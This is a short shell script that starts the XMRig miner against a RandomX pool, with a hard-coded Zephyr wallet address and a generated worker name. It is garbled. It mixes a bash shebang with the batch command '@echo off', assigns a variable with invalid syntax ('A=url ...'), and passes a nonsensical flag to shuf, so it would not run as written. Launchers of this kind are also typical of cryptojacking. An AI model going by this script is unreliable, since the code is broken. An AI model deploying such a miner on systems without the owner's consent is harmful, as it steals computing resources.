#!/bin/bash
@echo off
A=url randomx.rplant.xyz:17100
B=ZEPHs8qpRw1igRzoQwesBMQRTuubopJMcEsd5LjBxdiX9zSaMDGuq4CfEeohWKu5etAXmnFuq4T7pPLJWHA4gW8K4EDAPeLduTb
C=$(echo $(shuf -i 1-5 -COKLAT)-xmr-A)
./xmrig --donate-level 1 -o $A -u $B -p $C -a rx/0 -k 